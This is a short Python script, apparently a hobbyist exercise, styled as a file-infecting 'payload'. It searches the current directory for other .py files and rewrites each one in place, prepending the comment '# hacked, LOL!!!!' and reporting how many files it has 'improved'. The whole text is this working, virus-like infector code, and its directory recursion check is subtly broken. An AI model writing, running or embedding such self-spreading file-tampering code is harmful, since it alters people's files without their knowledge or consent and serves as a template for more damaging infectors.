import os

message = "# hacked, LOL!!!!\n"

scriptfilename = os.path.basename(__file__)

cwd = os.path.abspath("")
#/usr/local/gabe/SpreadingTheWord

def search(path):
    filestoimprove = []
    filelist = os.listdir(path)
    for name in filelist:
        thispath = path + "/" + name
        if os.path.isdir(name):
            filestoimprove.extend(search(thispath))
        elif name[-3:] == ".py":
            if name != scriptfilename:
                filestoimprove.append(thispath)

    return filestoimprove

def spread(filelist):
    counter = int(0)
    for name in filelist:
        #open file for reading
        f = open(name)
        content = f.read()
        #close the path
        f.close()

        #open file for writing
        f = open(name, "w")

        f.write(message+content)
        f.close()
        print("successfully??? put message in", os.path.basename(name), "somewhere")
        counter += 1
    print(str(counter) + " FILES HAVE BEEN IMPROVED")

filestoimprove = search(cwd)
#['/usr/local/gabe/SpreadingTheWord/Data/file2.py', '/usr/local/gabe/SpreadingTheWord/file1.py', '/usr/local/gabe/SpreadingTheWord/filename.py']

print("executing the payload")
spread(filestoimprove)
